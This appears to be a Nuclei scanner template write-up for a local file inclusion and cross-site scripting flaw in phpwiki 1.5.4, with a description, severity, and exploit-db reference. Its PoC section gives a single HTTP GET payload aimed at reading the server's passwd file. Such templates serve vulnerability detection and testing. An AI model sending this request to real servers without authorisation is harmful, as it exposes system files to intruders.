# Nuclei Template: phpwiki 1.5.4 - Cross-Site Scripting/Local File Inclusion
**Template ID:** phpwiki-lfi
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**Source:** Nuclei Template (`phpwiki-lfi.yaml`)

## Vulnerability Information & PoC

## Description
phpwiki 1.5.4 is vulnerable to cross-site scripting and local file inclusion, and allows remote unauthenticated attackers to include and return the content of locally stored files via the 'index.php' endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/phpwiki/index.php/passwd
```

## References
- https://www.exploit-db.com/exploits/38027
